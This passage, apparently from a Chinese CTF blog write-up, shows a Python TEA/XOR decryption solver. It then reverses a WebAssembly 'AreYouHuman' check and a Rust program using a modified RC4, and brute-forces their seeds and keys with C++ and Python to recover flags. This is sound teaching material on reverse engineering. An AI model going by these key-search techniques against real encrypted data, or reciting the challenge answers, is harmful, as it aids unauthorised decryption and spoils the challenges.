class="built_in">print</span>(<span class="string">&quot;Error: Payload not multiple of 16!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prepare Keys</span></span><br><span class="line">    key_list = <span class="built_in">list</span>(global_key_bytes)</span><br><span class="line">    key_hex = Eencrypt.join1(key_list)</span><br><span class="line">    tea_key = Eencrypt.by(key_hex)</span><br><span class="line">    </span><br><span class="line">    cs = <span class="number">50</span></span><br><span class="line">    vi = <span class="number">305419896</span></span><br><span class="line">    mask32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    decoded_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    chunk_size = <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload_data), chunk_size):</span><br><span class="line">        chunk = payload_data[offset : offset+chunk_size]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># [Plaintext(8)][Mask(8)]</span></span><br><span class="line">        plaintext_bytes = chunk[:<span class="number">8</span>]</span><br><span class="line">        mask_bytes = chunk[<span class="number">8</span>:]</span><br><span class="line">        </span><br><span class="line">        v0 = <span class="built_in">int</span>.from_bytes(plaintext_bytes[:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        v1 = <span class="built_in">int</span>.from_bytes(plaintext_bytes[<span class="number">4</span>:], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        v = (-<span class="number">50</span> * vi) &amp; mask32</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(cs):</span><br><span class="line">            <span class="comment"># Undo v1</span></span><br><span class="line">            temp_sum_v_v0 = (v + v0) &amp; mask32</span><br><span class="line">            val_shift = (v0 &gt;&gt; <span class="number">5</span>)</span><br><span class="line">            k3 = tea_key[<span class="number">3</span>]</span><br><span class="line">            temp_key3_v0_shift = (k3 - val_shift) &amp; mask32</span><br><span class="line">            k2 = tea_key[<span class="number">2</span>]</span><br><span class="line">            temp_key2_16v0 = (k2 + (v0 &lt;&lt; <span class="number">4</span>)) &amp; mask32</span><br><span class="line">            temp_v1_update = temp_sum_v_v0 ^ temp_key3_v0_shift ^ temp_key2_16v0</span><br><span class="line">            v1 = (v1 - temp_v1_update) &amp; mask32</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Undo v0</span></span><br><span class="line">            temp_sum_v_v1 = (v + v1) &amp; mask32</span><br><span class="line">            k1 = tea_key[<span class="number">1</span>]</span><br><span class="line">            temp_key1_v1_shift = (k1 + (v1 &gt;&gt; <span class="number">5</span>)) &amp; mask32</span><br><span class="line">            k0 = tea_key[<span class="number">0</span>]</span><br><span class="line">            temp_key0_16v1 = (k0 + (v1 &lt;&lt; <span class="number">4</span>)) &amp; mask32</span><br><span class="line">            temp_v0_update = temp_sum_v_v1 ^ temp_key1_v1_shift ^ temp_key0_16v1</span><br><span class="line">            v0 = (v0 - temp_v0_update) &amp; mask32</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Undo v</span></span><br><span class="line">            v = (v + vi) &amp; mask32</span><br><span class="line">            </span><br><span class="line">        v0_hex = <span class="built_in">hex</span>(v0)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        v1_hex = <span class="built_in">hex</span>(v1)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        text_hex = v0_hex + v1_hex</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            xor_result_bytes = <span class="built_in">bytes</span>.fromhex(text_hex)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hex error:&quot;</span>, text_hex)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        block_res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># Length of xor_result is 8 bytes.</span></span><br><span class="line">        <span class="comment"># Length of mask is 8 bytes.</span></span><br><span class="line">        <span class="comment"># But wait. My loop handles BLOCKS.</span></span><br><span class="line">        <span class="comment"># The Original Data block could be LESS than 8 bytes if it was the last one.</span></span><br><span class="line">        <span class="comment"># E.g. 1 byte data -&gt; 16 byte &quot;bt&quot; block.</span></span><br><span class="line">        <span class="comment"># Recovered &quot;text_hex&quot; is 16 chars (8 bytes).</span></span><br><span class="line">        <span class="comment"># xor_result_bytes is 8 bytes.</span></span><br><span class="line">        <span class="comment"># mask is 8 bytes.</span></span><br><span class="line">        <span class="comment"># XOR gives 8 bytes &quot;Result&quot;.</span></span><br><span class="line">        <span class="comment"># This &quot;Result&quot; is Padded Original Data?</span></span><br><span class="line">        <span class="comment"># xor logic in tea.py:</span></span><br><span class="line">        <span class="comment"># data[i] (1 byte?) No.</span></span><br><span class="line">        <span class="comment"># slice data[i:i+8].</span></span><br><span class="line">        <span class="comment"># If slice is shorter (e.g. 1 byte), xor(data, rand) uses ?</span></span><br><span class="line">        <span class="comment"># Eencrypt.xor behavior with different lengths:</span></span><br><span class="line">        <span class="comment"># It probably loops over min length?</span></span><br><span class="line">        <span class="comment"># Or it expects equal length?</span></span><br><span class="line">        <span class="comment"># My xor test `d=8, n=8`.</span></span><br><span class="line">        <span class="comment"># If `d=1, n=8`. `res` has what length?</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            b_val = xor_result_bytes[i]</span><br><span class="line">            m_val = mask_bytes[i]</span><br><span class="line">            block_res += <span class="built_in">bytes</span>([b_val ^ m_val])</span><br><span class="line">            </span><br><span class="line">        decoded_file += block_res</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Writing decrypted file...&quot;</span>)</span><br><span class="line">    <span class="comment"># Trim padding?</span></span><br><span class="line">    <span class="comment"># We don&#x27;t know the exact length.</span></span><br><span class="line">    <span class="comment"># But usually file formats have headers.</span></span><br><span class="line">    <span class="comment"># PNG? Or maybe flag text?</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag_solved&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(decoded_file)</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;First bytes:&quot;</span>, decoded_file[:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YWZjNDUwMzkwOTQ3YTY4YjQ1NTYxY2FkM2RmYjM1NjFfWGxETXdLWlVYZGJqTFhNZ0dXODlsY0tRRm9SMlo0UWNfVG9rZW46WDNnNGJLU3Fqb2FUaTZ4dGU2TWNRcVJXbmlmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="是人类吗？"><a href="#是人类吗？" class="headerlink" title="是人类吗？"></a>是人类吗？</h3><p>题目信息</p>
<ul>
<li><strong>名称</strong>: AreYouHuman</li>
<li><strong>类型</strong>: Reverse &#x2F; WebAssembly</li>
<li><strong>目标</strong>: 获取 Flag</li>
</ul>
<p>解题步骤</p>
<ol>
<li>初步分析</li>
</ol>
<p>打开题目附件，发现包含 <code>index.html</code>, <code>verify.js</code> 和 <code>verify.wasm</code>。这显然是一个基于 WebAssembly 的前端逆向题目。</p>
<p>查看 <code>index.html</code>，发现核心逻辑是记录鼠标轨迹，然后调用 <code>Module.ccall(&#39;verify_human&#39;, ...)</code> 进行验证。</p>
<p>如果返回的字符串以 “UniCTF” 开头，则验证成功。</p>
<ol start="2">
<li>分析 verify.wasm</li>
</ol>
<p>将 <code>verify.wasm</code> 转换为 <code>verify.wat</code> (WebAssembly Text Format) 进行阅读，或者直接在 IDA Pro 中分析（需配合对应插件，本题已提供 mcp 连接）。</p>
<p>定位到导出函数 <code>verify_human</code> (Func 2)。分析其汇编逻辑：</p>
<ol>
<li><strong>输入处理</strong>：函数接收坐标数组 <code>x</code>, <code>y</code> 和长度 <code>len</code>。</li>
<li><strong>特征计算</strong>：<ol>
<li>遍历坐标点，计算位移 <code>dx</code>, <code>dy</code>。</li>
<li>计算由 <code>dx</code>, <code>dy</code> 构成的速度 (<code>Speed</code>) 和加速度 (<code>Acc</code>).</li>
<li>累加 <code>Speed</code> 以及 <code>Acc</code> 的平方。</li>
<li>最终计算出四个分量：<ul>
<li><code>val_1</code> (Bits 48-63): 与 <code>len</code> 相关 (<code>len * 0.16</code>).</li>
<li><code>val_2</code> (Bits 32-47): 平均速度 (<code>Avg Speed</code>).</li>
<li><code>val_3</code> (Bits 16-31): Y轴平均加速度特征 (<code>Avg AccY^2 * 2</code>).</li>
<li><code>val_4</code> (Bits 0-15): X轴平均加速度特征 (<code>Avg AccX^2 * 2</code>).</li>
</ul>
</li>
</ol>
</li>
<li><strong>Seed 构造</strong>：</li>
</ol>
<p><code>Seed = (val_1 &lt;&lt; 48) | (val_2 &lt;&lt; 32) | (val_3 &lt;&lt; 16) | val_4</code>。</p>
<ol>
<li><strong>解密过程</strong>：</li>
</ol>
<p>利用构造的 Seed 作为初始状态，运行 LCG (Linear Congruential Generator) 算法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">State = State * 0x5851F42D4C957F2D + 0x14057B7EF767814F</span><br><span class="line">KeyByte = State &gt;&gt; 56</span><br></pre></td></tr></table></figure>

<p>将内存中偏移 1024 处的密文与 <code>KeyByte</code> 异或。</p>
<ol>
<li><strong>返回结果</strong>：返回解密后的字符串。</li>
<li>解密策略</li>
</ol>
<p>密文存储在 WASM 的 Data Section (偏移 1024)。</p>
<p>我们需要找到正确的 <code>Seed</code>，使得解密出的明文以 “UniCTF” 开头。</p>
<p>由于 <code>Seed</code> 是由四个“生物特征值”拼接而成，且题目提示这些值“通常不会太大”，我们可以暴力枚举这四个分量。</p>
<ul>
<li><code>L</code> (Len部分): 范围 0 - 65535 (实际绘图长度有限，扫描 0-2000 足够，或者扫描全部)。</li>
<li><code>S</code> (Speed): 0 - 255。</li>
<li><code>Y</code> (Jitter Y): 0 - 255。</li>
<li><code>X</code> (Jitter X): 0 - 255。</li>
</ul>
<p>使用 C++ 编写求解脚本以提高效率。</p>
<ol start="4">
<li>求解过程</li>
</ol>
<p>提取密文：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B8 31 64 0E 54 CF ... (共46字节)</span><br></pre></td></tr></table></figure>

<p>运行求解脚本 (<code>solver_final.cpp</code>)，核心逻辑：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="number">65535</span>; l++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt; <span class="number">100</span>; s++) &#123; <span class="comment">// 假设值较小</span></span><br><span class="line">        u64 high = ((u64)l &lt;&lt; <span class="number">48</span>) | ((u64)s &lt;&lt; <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">0</span>; y &lt; <span class="number">100</span>; y++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">                u64 seed = high | ((u64)y &lt;&lt; <span class="number">16</span>) | x;</span><br><span class="line">                <span class="comment">// 模拟 LCG 并检查前缀 &quot;UniCTF&quot;</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行得到唯一有效解：</p>
<ul>
<li><strong>Seed</strong>: <code>5629563964489770</code></li>
<li><strong>Decrypted</strong>: <code>UniCTF&#123;Hum4n_Err0r_1s_The_Tru3_P4ssw0rd_8x92a&#125;</code></li>
<li><strong>Components</strong>: S&#x3D;15, Y&#x3D;88, X&#x3D;42.</li>
<li>Flag 计算</li>
</ul>
<p>根据题目要求：</p>
<p>Flag &#x3D; <code>UniCTF&#123;md5(验证通过字符串 + 生物特征值之和)&#125;</code></p>
<p>逆向得到的特征值为：LengthFactor(20), Speed(15), JitterY(88), JitterX(42)。</p>
<p>包含所有 Seed 分量的和 &#x3D; $20 + 15 + 88 + 42 &#x3D; 165$。</p>
<p>组合字符串: <code>UniCTF&#123;Hum4n_Err0r_1s_The_Tru3_P4ssw0rd_8x92a&#125;165</code></p>
<p>计算 MD5: <code>32f9b4c728f42db8ecd6d631cc950495</code></p>
<p><strong>Final Flag</strong>: <code>UniCTF&#123;32f9b4c728f42db8ecd6d631cc950495&#125;</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    u64 A = <span class="number">6364136223846793005ULL</span>;</span><br><span class="line">    u64 B = <span class="number">1442695040888963407ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc_data[] = &#123;</span><br><span class="line">        <span class="number">0xB8</span>, <span class="number">0x31</span>, <span class="number">0x64</span>, <span class="number">0x0E</span>, <span class="number">0x54</span>, <span class="number">0xCF</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x4B</span>, <span class="number">0x73</span>, <span class="number">0xDD</span>, <span class="number">0x57</span>, <span class="number">0xE6</span>, <span class="number">0xCD</span>, <span class="number">0x45</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x2C</span>, <span class="number">0x56</span>, <span class="number">0xE1</span>, <span class="number">0x89</span>, <span class="number">0x86</span>, <span class="number">0xAC</span>, <span class="number">0xC3</span>, <span class="number">0x32</span>, <span class="number">0x0A</span>, <span class="number">0x07</span>, <span class="number">0xF3</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0xB1</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xAD</span>, <span class="number">0x32</span>, <span class="number">0xF2</span>, <span class="number">0xD5</span>, <span class="number">0x64</span>, <span class="number">0xD3</span>, <span class="number">0xCB</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x99</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0x92</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> target[] = <span class="string">&quot;UniCTF&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) k[i] = enc_data[i] ^ target[i];</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Scanning vFinal...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ranges: Full L, Small S, Y, X</span></span><br><span class="line">    <span class="comment">// L: 0..65535</span></span><br><span class="line">    <span class="comment">// S: 0..60 (Strictly small)</span></span><br><span class="line">    <span class="comment">// Y: 0..60</span></span><br><span class="line">    <span class="comment">// X: 0..60</span></span><br><span class="line">    <span class="comment">// Total: 65536 * 60 * 60 * 60 = 1.4 * 10^10. ~14 seconds.</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Scanning vFinal (Full L, Small Bio)...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> omp parallel for</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt;= <span class="number">65535</span>; l++) &#123;</span><br><span class="line">        <span class="comment">// if (l % 1000 == 0) cout &lt;&lt; &quot;L=&quot; &lt;&lt; l &lt;&lt; &quot;\r&quot; &lt;&lt; flush; // Avoid cout in omp</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt;= <span class="number">100</span>; s++) &#123;</span><br><span class="line">            u64 high = ((u64)l &lt;&lt; <span class="number">48</span>) | ((u64)s &lt;&lt; <span class="number">32</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">0</span>; y &lt;= <span class="number">100</span>; y++) &#123;</span><br><span class="line">                u64 high_y = high | ((u64)y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">100</span>; x++) &#123;</span><br><span class="line">                    u64 seed = high_y | (u64)x;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// Check K0</span></span><br><span class="line">                    u64 st = seed * A + B;</span><br><span class="line">                    <span class="keyword">if</span> ((st &gt;&gt; <span class="number">56</span>) != k[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// Check K1</span></span><br><span class="line">                    st = st * A + B;</span><br><span class="line">                    <span class="keyword">if</span> ((st &gt;&gt; <span class="number">56</span>) != k[<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Check K2</span></span><br><span class="line">                    st = st * A + B;</span><br><span class="line">                    <span class="keyword">if</span> ((st &gt;&gt; <span class="number">56</span>) != k[<span class="number">2</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Check K3</span></span><br><span class="line">                    st = st * A + B;</span><br><span class="line">                    <span class="keyword">if</span> ((st &gt;&gt; <span class="number">56</span>) != k[<span class="number">3</span>]) <span class="keyword">continue</span>;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// Check K4</span></span><br><span class="line">                    st = st * A + B;</span><br><span class="line">                    <span class="keyword">if</span> ((st &gt;&gt; <span class="number">56</span>) != k[<span class="number">4</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Check K5</span></span><br><span class="line">                    st = st * A + B;</span><br><span class="line">                    <span class="keyword">if</span> ((st &gt;&gt; <span class="number">56</span>) != k[<span class="number">5</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Found!</span></span><br><span class="line">                    <span class="meta">#<span class="keyword">pragma</span> omp critical </span></span><br><span class="line">                    &#123;</span><br><span class="line">                        cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;FOUND CANDIDATE: &quot;</span> &lt;&lt; seed </span><br><span class="line">                             &lt;&lt; <span class="string">&quot; L=&quot;</span> &lt;&lt; l &lt;&lt; <span class="string">&quot; S=&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot; Y=&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; X=&quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Decrypt full</span></span><br><span class="line">                        string decrypted = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        u64 check_st = seed;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">46</span>; i++) &#123;</span><br><span class="line">                            check_st = check_st * A + B;</span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">char</span> kk = (check_st &gt;&gt; <span class="number">56</span>);</span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">char</span> p = enc_data[i] ^ kk;</span><br><span class="line">                            <span class="keyword">if</span> (p == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">                            decrypted += (<span class="type">char</span>)p;</span><br><span class="line">                        &#125;</span><br><span class="line">                        cout &lt;&lt; <span class="string">&quot;Decrypted: &quot;</span> &lt;&lt; decrypted &lt;&lt; endl;</span><br><span class="line">                        cout &lt;&lt; <span class="string">&quot;BioSum(S+Y+X): &quot;</span> &lt;&lt; (s+y+x) &lt;&lt; endl;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;Done.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg2ZGVjOWY3MmRlZjEyZDQxMGYzY2FmYzI3NjE0ZTNfbE5pdkdFc21jQUR3VXRlbHpLTFpDbFgzd0Y4QzdtRnZfVG9rZW46Rjk5S2I2VGZjb2YwaG14ZUxCNWNWblhabm1jXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="r-png"><a href="#r-png" class="headerlink" title="r_png"></a>r_png</h3><p>题目分析</p>
<p>拿到题目文件 <code>enc</code> (Linux ELF 64-bit) 和 <code>flagpngenc</code> (加密后的文件)。</p>
<ol>
<li>初步分析</li>
</ol>
<p>将 <code>enc</code> 放入 IDA Pro 进行分析。</p>
<p>通过字符串列表发现 Rust 相关的路径信息，确定这是一个 Rust 编写的程序。</p>
<p>找到入口点 <code>start</code>，进而定位到 <code>main</code> 函数，最终找到核心逻辑函数 <code>encode</code> (地址 <code>0x16a40</code>)。</p>
<ol start="2">
<li>逻辑逆向</li>
</ol>
<p>分析 <code>encode</code> 函数：</p>
<ul>
<li><strong>参数检查</strong>: 代码检查了参数数量，并且检查最后一个参数（Key）必须是 4 字节长度，且每个字符都在 ‘0’-‘9’ 之间。这极大地缩小了密钥空间 (0000-9999)。</li>
<li><strong>S-box 初始化</strong>: 代码中有一段通过 <code>qmemcpy</code> 和多个 <code>xmmword</code> 常量填充栈上 256 字节缓冲区的逻辑。通过提取这些数据，发现其实就是 <code>0x00</code> 到 <code>0xFF</code> 的顺序排列。</li>
<li><strong>KSA 过程</strong>: 有一个 256 次的循环，根据 Key 对 S-box 进行打乱。这就是标准的 RC4 KSA。</li>
<li><strong>加密过程</strong>: 随后的循环遍历输入数据，生成密钥流。但是有一点不同：<code>buf[i] ^= (K + 69)</code>。即异或的值不是直接的 RC4 密钥流，而是加了 69。</li>
<li><ol start="3">
<li>解密脚本编写</li>
</ol>
</li>
</ul>
<p>根据分析，编写 Python 脚本进行暴力破解：</p>
<ol>
<li>读取 <code>flagpngenc</code>。</li>
<li>循环 <code>key</code> 从 “0000” 到 “9999”。</li>
<li>模拟程序的 RC4 初始化和 KSA 过程。</li>
<li>在 PRGA 阶段，计算 <code>keystream_byte = (RC4_K + 69) % 256</code>。</li>
<li>解密：<code>plain_byte = cipher_byte ^ keystream_byte</code>。</li>
<li>验证：判断解密出的前 8 字节是否为 PNG 文件头。</li>
<li>获取 Flag</li>
</ol>
<p>运行脚本，秒出结果：</p>
<ul>
<li><strong>Key</strong>: <code>7999</code></li>
<li>解密出的图片 <code>flag.png</code> 包含 Flag。</li>
</ul>
<p>附件</p>
<ul>
<li><code>solve_flag.py</code>: 解密脚本。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flagpngenc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            ciphertext = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flagpngenc not found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Read <span class="subst">&#123;<span 